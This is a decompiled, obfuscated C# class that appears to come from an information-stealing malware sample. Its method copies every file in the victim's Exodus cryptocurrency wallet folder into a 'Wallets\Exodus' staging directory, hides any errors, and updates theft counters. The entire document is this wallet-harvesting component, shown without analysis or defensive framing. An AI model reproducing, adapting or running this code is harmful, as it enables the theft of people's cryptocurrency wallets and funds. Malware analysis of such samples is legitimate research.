using System;
using System.IO;
using Moist;

// Token: 0x02000060 RID: 96
internal class Class33
{
	// Token: 0x06000255 RID: 597 RVA: 0x00012DD4 File Offset: 0x00010FD4
	public static void smethod_0(string string_1)
	{
		try
		{
			foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppDate + "\\Exodus\\exodus.wallet\\").GetFiles())
			{
				Directory.CreateDirectory(string_1 + Class33.string_0);
				fileInfo.CopyTo(string_1 + Class33.string_0 + fileInfo.Name);
			}
			Class33.int_0++;
			Class37.int_0++;
		}
		catch
		{
		}
	}

	// Token: 0x06000256 RID: 598 RVA: 0x0000446C File Offset: 0x0000266C
	public Class33()
	{
		Class40.gcO0h7LzslQIW();
		base..ctor();
	}

	// Token: 0x06000257 RID: 599 RVA: 0x000052B6 File Offset: 0x000034B6
	// Note: this type is marked as 'beforefieldinit'.
	static Class33()
	{
		Class40.gcO0h7LzslQIW();
		Class33.int_0 = 0;
		Class33.string_0 = "\\Wallets\\Exodus\\";
	}

	// Token: 0x04000110 RID: 272
	public static int int_0;

	// Token: 0x04000111 RID: 273
	public static string string_0;
}
